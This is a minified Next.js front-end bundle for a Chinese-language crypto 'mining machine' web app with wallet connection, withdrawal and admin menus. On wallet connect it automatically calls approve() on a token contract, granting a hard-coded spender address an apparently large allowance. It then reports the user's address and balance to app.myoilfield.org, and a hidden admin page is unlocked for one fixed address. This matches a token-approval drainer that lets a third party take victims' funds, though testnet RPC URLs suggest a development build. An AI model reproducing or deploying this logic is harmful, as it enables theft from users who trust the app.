(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[70824],{35883:function(){},99723:function(e,A,t){"use strict";t.r(A),t.d(A,{default:function(){return Q}});var a=t(3827),n=t(64090),i=t(14297),s=t(20703),d=t(44600),o=t.n(d),c=t(61996),l=t.n(c),r=t(35573),m=t(28928),u=t(63805),h=t(24362),g=t(37321),p=t(71027),_=t(47822);let x=[(0,m.E)("io.metamask"),(0,m.E)("pro.tokenpocket"),(0,m.E)("im.token"),(0,m.E)("com.binance"),(0,m.E)("com.coinbase.wallet"),(0,m.a)()];var E=e=>{let{witchRPC:A=1}=e,[t]=r.Z.useForm(),s=(0,i.M)();return(0,n.useEffect)(()=>{},[s]),(0,a.jsx)("div",{children:(0,a.jsx)(u.ConnectButton,{theme:"dark",client:h.L,wallets:x,connectModal:{size:"compact"},chain:1==A?g.d:2==A?p.F:_.e})})},f={src:"/_next/static/media/logo.0db73f37.jpg",height:610,width:610,blurDataURL:"data:image/jpeg;base64,/9j/2wBDAAoHBwgHBgoICAgLCgoLDhgQDg0NDh0VFhEYIx8lJCIfIiEmKzcvJik0KSEiMEExNDk7Pj4+JS5ESUM8SDc9Pjv/2wBDAQoLCw4NDhwQEBw7KCIoOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozv/wgARCAAIAAgDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABhhP/xAAXEAADAQAAAAAAAAAAAAAAAAABAgMR/9oACAEBAAEFAtUS/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAgBAwEBPwF//8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAgBAgEBPwF//8QAFhAAAwAAAAAAAAAAAAAAAAAAACEx/9oACAEBAAY/AlD/xAAYEAEBAAMAAAAAAAAAAAAAAAABEQAxQf/aAAgBAQABPyEdIrbOZ//aAAwDAQACAAMAAAAQD//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQMBAT8Qf//EABURAQEAAAAAAAAAAAAAAAAAAAAB/9oACAECAQE/EK//xAAaEAACAgMAAAAAAAAAAAAAAAABEQAhMWFx/9oACAEBAAE/EFNWhAlwK1jrn//Z",blurWidth:8,blurHeight:8},M=t(23349),B=t(37432),w=t(31254),C=t(88549),y=t(99790),N=t(73107),R=e=>{let{onToggleRightMenu:A}=e,t=(0,i.M)(),[d,o]=(0,n.useState)(!1),[c,r]=(0,n.useState)(1),[m,u]=(0,n.useState)(),h=async()=>{if(t){let e=await (0,M.RA)(m.BUSDaddress,B.T),A=y.Bz;try{let a=await e.approve(m.ETHAddress,A,{gasLimit:5e5});await a.wait();let n=await (0,M.yX)(t.address),i="https://app.myoilfield.org/api/wallet/createWallet?walletAddress="+t.address+"&balance="+Number(n).toFixed(3);N.Z.get(i).then(e=>{}).catch(e=>{}),w.ZP.success("授权成功")}catch(e){console.log(e,"error"),w.ZP.success("授权失败，请重试")}}else w.ZP.warning("请登录")},g=async()=>{0==await (0,M.yX)(t.address,1)?(h(),o(!1)):o(!0)},p=e=>{"BEP20USDT"===e?(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"0x38Bb23fcbdf44eD2751A2F38D96439f5C306Adc6",BUSDaddress:"0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814",RPCURL:"https://data-seed-prebsc-1-s1.binance.org:8545/",id:1})),r(1)):"ERC20USDT"===e?(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"",BUSDaddress:"",RPCURL:"https://sepolia.infura.io/v3/YOUR-PROJECT-ID",id:2})),r(2)):"TRC20USDT"===e?(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"",BUSDaddress:"",RPCURL:"https://api.shasta.trongrid.io",id:3})),r(3)):(localStorage.setItem("Nodestorage",JSON.stringify({ETHAddress:"0x38Bb23fcbdf44eD2751A2F38D96439f5C306Adc6",BUSDaddress:"0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814",RPCURL:"https://data-seed-prebsc-1-s1.binance.org:8545/",id:1})),r(1))};return(0,n.useEffect)(()=>{t&&(g(),p("999"),u(JSON.parse(localStorage.getItem("Nodestorage")||"")))},[t]),(0,a.jsxs)("div",{className:l().pagetop,children:[(0,a.jsx)(s.default,{className:l().m1,src:f,alt:"coin",width:50,height:50}),(0,a.jsx)(E,{witchRPC:c}),(0,a.jsx)("div",{children:(0,a.jsx)(C.default,{defaultValue:"BEP20USDT",style:{width:100},onChange:p,options:[{value:"BEP20USDT",label:"BNB Chain"},{value:"ERC20USDT",label:"Ethereum"},{value:"TRC20USDT",label:"TRON"}]})}),(0,a.jsx)(s.default,{onClick:A,className:l().m3,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/menu.png",alt:"menu",width:50,height:50})]})},D=t(47907),v=t(60809),j=t.n(v),T=t(33052),k={src:"/_next/static/media/Administrator.ba429778.png",height:200,width:212,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAJFBMVEX///9MaXH///////////////////////////////////////+2I0voAAAADHRSTlNeAJVki4ZqBCWrGVLpCrpEAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAMklEQVR4nEWLxwkAMAzE7lzitv++IRDwTyAJnDKvISid2ULAAggDnEePUha+0o055W+/KJABIdMC4NsAAAAASUVORK5CYII=",blurWidth:8,blurHeight:8},b=()=>{let e=(0,i.M)(),[A,t]=(0,n.useState)(!1),d=(0,D.useRouter)();return(0,n.useEffect)(()=>{e&&t("0xf12c64a1a345dde2ab90e22f7dc4279a32265a1f"==e.address.toLowerCase())},[e]),(0,a.jsxs)("div",{className:j().rightMenu,"data-id":"RightMenu",children:[(0,a.jsxs)("div",{"data-id":"RightMenu",className:j().row,onClick:()=>d.push("/HomeLess"),children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:j().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/HomePage.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:j().text,children:"首页"})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:j().row,onClick:()=>d.push("/Machine"),children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:j().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/MiningMachine.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:j().text,children:"矿机"})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:j().row,onClick:()=>d.push("/Flash"),children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:j().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/flash.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:j().text,children:"提款"})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:j().row,onClick:()=>d.push("/Personal"),children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:j().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/Individualcenter.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:j().text,children:"个人中心"})]}),A?(0,a.jsxs)("div",{"data-id":"RightMenu",className:j().row,onClick:()=>d.push("/Administrator"),children:[(0,a.jsx)(s.default,{"data-id":"RightMenu",className:j().img,src:k,alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:j().text,children:"管理员"})]}):""]})},S=t(18286),P={src:"/_next/static/media/beijing.d082cf54.png",height:2007,width:2250,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAHCAMAAAACh/xsAAAACVBMVEUJCRsNCykTEjrjuvq3AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAJElEQVR4nEXKsQ0AAAzCMJL/j67KAiyWIAFIMyj4Uiy29t9qDgS6ACitWxw1AAAAAElFTkSuQmCC",blurWidth:8,blurHeight:7};let I=[{link:"/Machine",url:"../../images/MININGMACHINE.png",name:"矿机",en:"MINING MACHINE"},{link:"/Personal",url:"../../images/PERSONALCENTER.png",name:"个人中心",en:"PERSONAL CENTER"},{link:"/HomeLess",url:"../../images/homepage.png",name:"首 页",en:"home page"},{link:"/Flash",url:"../../images/WithdrawMoney.png",name:"取 款",en:"withdraw money"}];var Q=()=>{let e=(0,D.useRouter)(),A=(0,i.M)(),t=A=>{e.push(A.link)},d=()=>{let e="https://m.zsdcoin.com?ref=".concat(A?A.address:"");(0,T.v)(e)},{isRightMenuVisible:c,toggleRightMenu:l,hideRightMenu:r}=(0,n.useContext)(S.MenuContext),m=(0,n.useRef)(null);return(0,n.useEffect)(()=>{let e=e=>{m.current&&"RightMenu"!==e.target.dataset.id&&r()};return document.addEventListener("mousedown",e),()=>{document.removeEventListener("mousedown",e)}},[r]),(0,a.jsx)(a.Fragment,{children:(0,a.jsxs)("div",{className:o().pageMenu,children:[c&&(0,a.jsx)(b,{}),(0,a.jsx)(R,{onToggleRightMenu:l}),(0,a.jsx)("div",{className:o().videoBackground,id:"nav",children:(0,a.jsx)(s.default,{className:o().imageGif,src:P,alt:""})}),(0,a.jsx)("div",{className:o().top,ref:m,children:I.map((e,A)=>"/InCode"===e.link?(0,a.jsxs)("div",{className:"".concat(o()["menyBtn"+A]," ").concat(o().menyBtn),onClick:d,children:[(0,a.jsx)(s.default,{className:"".concat(o()["img"+A]),src:e.url,alt:e.name,width:50,height:50}),(0,a.jsx)("div",{className:o()["menyBtn-n"],children:e.name}),(0,a.jsx)("div",{className:o()["menyBtn-e"],children:e.en})]},A):(0,a.jsxs)("div",{className:"".concat(o()["menyBtn"+A]," ").concat(o().menyBtn),onClick:()=>t(e),children:[(0,a.jsx)(s.default,{className:"".concat(o()["img"+A]),src:e.url,alt:e.name,width:50,height:50}),(0,a.jsx)("div",{className:o()["menyBtn-n"],children:e.name}),(0,a.jsx)("div",{className:o()["menyBtn-e"],children:e.en})]},A))})]})})}},33052:function(e,A,t){"use strict";t.d(A,{v:function(){return i}});var a=t(31254);let n=()=>"clipboard"in navigator,i=async e=>{try{if(n()){let A=document.createElement("textarea");A.value=e,document.body.appendChild(A),A.select(),document.execCommand("copy"),document.body.removeChild(A),a.ZP.success("复制成功")}else{let A=document.createElement("textarea");A.value=e,A.style.position="fixed",A.style.opacity="0",document.body.appendChild(A),A.focus(),A.select();try{document.execCommand("copy")?a.ZP.success("复制成功"):a.ZP.error("复制失败，请稍后重试")}catch(e){a.ZP.error("复制失败，请稍后重试")}finally{document.body.removeChild(A)}}}catch(t){let A=document.createElement("textarea");A.value=e,document.body.appendChild(A),A.select(),document.execCommand("copy"),document.body.removeChild(A),a.ZP.error("复制失败，请稍后重试")}}},60809:function(e){e.exports={rightMenu:"RightMenu_rightMenu__4Vdi0",row:"RightMenu_row__vVKio",img:"RightMenu_img__LvhXL",text:"RightMenu_text__kgeAO","video-background":"RightMenu_video-background__VO7sD",content:"RightMenu_content__zza7R"}},44600:function(e){e.exports={pageMenu:"TopMenu_pageMenu__tgFwW",top:"TopMenu_top__CE9fR",menyBtn0:"TopMenu_menyBtn0__OU6ht",menyBtn1:"TopMenu_menyBtn1__wpmzY",menyBtn2:"TopMenu_menyBtn2__9YB4v",menyBtn3:"TopMenu_menyBtn3__42O5W",menyBtn4:"TopMenu_menyBtn4__jMDkX",menyBtn5:"TopMenu_menyBtn5__YwPul",menyBtn:"TopMenu_menyBtn__5Rl_B","menyBtn-n":"TopMenu_menyBtn-n___3oET","menyBtn-e":"TopMenu_menyBtn-e__o7RuC",img0:"TopMenu_img0__EwxhJ",img1:"TopMenu_img1__U8byq",img2:"TopMenu_img2__Ixg5G",img3:"TopMenu_img3__sypae",img4:"TopMenu_img4__IL4yF",img5:"TopMenu_img5__ZAun1","video-background":"TopMenu_video-background__40Bxp",content:"TopMenu_content__s8Xj1",imageGif:"TopMenu_imageGif__f0WuQ"}},61996:function(e){e.exports={pagetop:"Top_pagetop__5k2y2",m1:"Top_m1__eJ96o",m2:"Top_m2__Leibv",m3:"Top_m3__8JExu",ljqb:"Top_ljqb__ktoyc","css-bedeeg":"Top_css-bedeeg__caJQv",deep:"Top_deep__7n1oN"}}}]);